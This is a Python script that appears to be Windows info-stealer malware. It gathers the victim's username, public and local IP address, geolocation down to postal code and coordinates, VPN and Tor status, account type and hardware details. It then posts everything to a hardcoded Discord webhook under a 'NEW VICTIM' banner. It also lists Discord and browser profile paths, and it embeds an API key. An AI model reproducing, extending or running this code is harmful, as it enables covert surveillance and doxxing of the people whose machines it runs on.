import os
import re
import json
import platform as pl
import requests
import locale
import getpass
import winreg
import psutil
import socket
import wmi
from re import findall
from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1057677695657459732/VDupV2JEFE5lIGGrBIU3AVDZtzKsFYAFXvw5qlOs6ZWnMj9hEybS2DqV_S67l2ihvjFX'

# mentions you when you get a hit
PING_ME = True

# Get system language
language, encoding = locale.getlocale()

# Get current user's name
username = getpass.getuser()
message = ""

# Get the local IP address
local_ip_address = socket.gethostbyname(socket.gethostname())

c = wmi.WMI()
microsoft = "Unknown"

vpnresult = ''

# CPU information
cpu_count = psutil.cpu_count()
cpu_freq = psutil.cpu_freq().current
cpu_percent = psutil.cpu_percent()

# Memory information
mem_total = psutil.virtual_memory().total
mem_available = psutil.virtual_memory().available
mem_percent = psutil.virtual_memory().percent

# Disk information
disk_usage = psutil.disk_usage('/')

# GPU information
try:
    import GPUtil
    gpus = GPUtil.getGPUs()
    gpu_model = gpus[0].name
except:
    gpu_model = "No GPU found"

# CPU model
cmdline = " ".join(psutil.Process().cmdline())
for part in cmdline.split("--"):
    if "model name" in part:
        cpu_model = part.strip().split(": ")[1]
        break
else:
    cpu_model = "Unknown CPU model"

# GPU information
try:
    import GPUtil
    gpus = GPUtil.getGPUs()
    gpu_model = gpus[0].name
except:
    gpu_model = "No GPU found"

if os.path.exists(os.path.join(os.getenv('USERPROFILE'), 'MicrosoftAccount')):
    print("Microsoft account found.")
    for user in c.Win32_UserAccount():
        if user.Caption == "Guest":
            continue
        try:
            if "MicrosoftAccount" in user.SID:
                for account in c.Win32_Account():
                    if account.SID == user.SID:
                        if account.Domain == "MicrosoftAccount":
                            microsoft = "True, account is a Microsoft account"
                        else:
                            microsoft = "False, account is a local account"
                break
        except Exception as e:
            print("Error while checking for Microsoft account:", e)
            microsoft = "Unknown"
else:
    print("Microsoft account not found.")
    microsoft = "False, account is a local account"



def get_ip_info_dump():
    response = requests.get("https://ipinfo.io/json")
    data = response.json()
    return data






ip_address = requests.get('https://api.ipify.org').text
Securl = f"https://vpnapi.io/api/{ip_address}?key=f3c961a55691497fb7eb98fa6bdfd111"
response2 = requests.get(Securl)
data = response2.json()
    
vpn_status = (data['security']['vpn'])
proxy_status = (data['security']['proxy'])
tor_status = (data['security']['tor'])
relay_status = (data['security']['relay'])
    



    



def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    if PING_ME:
        message = '<@515402023223427072>'
    ip_info = get_ip_info_dump()
    
    if not (relay_status or proxy_status or tor_status or vpn_status):
        message = f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n<@515402023223427072>\n**NEW VICTIM**\n\n\n\n**Device**\n```\nDevice Info: {pl.uname()}\nDevice IP: {ip_address}\nLocal IP: {local_ip_address}\nSystem language: {language}\nCurrent user: {username}\nLocal Account: {microsoft}```\n\n**IP Address Dump**\n```\nDevice IP: {ip_info["ip"]}\nCity: {ip_info["city"]}\nRegion: {ip_info["region"]}\nCountry: {ip_info["country"]}\nPostal code: {ip_info["postal"]}\nTimezone: {ip_info["timezone"]}\nOrganization: {ip_info["org"]}\nCoordinates: {ip_info["loc"]}```\n\n**Security Info**\n```\nVPN: {vpn_status}\nProxy: {proxy_status}\nTor: {tor_status}\nRelay: {relay_status}```\n**Hardware Info**```CPU Model: {cpu_model}\nCPU Count: {cpu_count}\nCPU Frequency: {cpu_freq}\nCPU Usage: {cpu_percent}%\nGPU Model: {gpu_model}\nTotal Memory: {mem_total}\nAvailable Memory: {mem_available}\nMemory Usage: {mem_percent}%\nDisk Usage: {disk_usage}```'
    else:
        message = f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n<@515402023223427072>\n**NEW VICTIM**\n\n\n\n**Device**\n```\nDevice Info: {pl.uname()}\nDevice IP: {ip_address}             ⚠️VPN Detected\nLocal IP: {local_ip_address}\nSystem language: {language}\nCurrent user: {username}\nLocal Account: {microsoft}```\n\n**IP Address Dump**⚠️\n```\nDevice IP: {ip_info["ip"]}             ⚠️VPN Detected\nCity: {ip_info["city"]}             ⚠️VPN Detected\nRegion: {ip_info["region"]}             ⚠️VPN Detected\nCountry: {ip_info["country"]}             ⚠️VPN Detected\nPostal code: {ip_info["postal"]}             ⚠️VPN Detected\nTimezone: {ip_info["timezone"]}             ⚠️VPN Detected\nOrganization: {ip_info["org"]}\nCoordinates: {ip_info["loc"]}             ⚠️VPN Detected```\n\n**Security Info**\n```\nVPN: {vpn_status}\nProxy: {proxy_status}\nTor: {tor_status}\nRelay: {relay_status}\n```\n**Hardware Info**```CPU Model: {cpu_model}\nCPU Count: {cpu_count}\nCPU Frequency: {cpu_freq}\nCPU Usage: {cpu_percent}%\nGPU Model: {gpu_model}\nTotal Memory: {mem_total}\nAvailable Memory: {mem_available}\nMemory Usage: {mem_percent}%\nDisk Usage: {disk_usage}```'


    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
  
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
